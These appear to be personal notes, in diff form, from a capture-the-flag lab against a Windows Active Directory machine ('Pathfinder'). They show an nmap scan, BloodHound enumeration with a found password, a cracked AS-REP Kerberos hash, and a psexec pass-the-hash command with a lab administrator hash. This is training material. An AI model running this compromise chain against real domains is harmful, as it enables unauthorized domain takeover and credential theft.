@@ -1,0 +1,67 @@
+ping 10.10.10.30 to see if its active
+-------------------------------------------
+nmap -sC -sV 10.10.10.30
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-06 18:37:59Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=7/6%Time=5F030C45%P=x86_64-pc-linux-gnu%r(DNSVe
+SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
+SF:04bind\0\0\x10\0\x03");
+Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h03m34s                                                                                                                                                
+| smb2-security-mode:                                                                                                                                                 
+|   2.02:                                                                                                                                                             
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-07-06T18:40:22
+|_  start_date: N/A
+ ------------------------------------------------------------------
+
+ https://www.varonis.com/blog/the-difference-between-active-directory-and-ldap/
+ Haven't encountered ldap and active directory before
+ The relationship between AD and LDAP is much like the relationship between Apache and HTTP:
+
+    HTTP is a web protocol.
+    Apache is a web server that uses the HTTP protocol.
+    LDAP is a directory services protocol.
+    Active Directory is a directory server that uses the LDAP protocol.
+-------------------------------------------------------------------
+Bloodhound is used after you have a foothold to escalate for active directory
+We have a foothold because of the sandra account found last time with the password as Password1234!
+-------------------------------------------------------------------
+
+bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -ns 10.10.10.30
+
+-d domain
+-u username
+-p password
+-gc group catalog
+-----------------------------------------
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Sheffield19      ($krb5asrep$23$svc_bes@MEGACORP.LOCAL)
+1g 0:00:00:21 DONE (2020-07-07 15:30) 0.04551g/s 482613p/s 482613c/s 482613C/s Sherbear94..Sheepy04
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+-----------------------------------------
+psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+Just followed the walthrough had quite a lot of problem
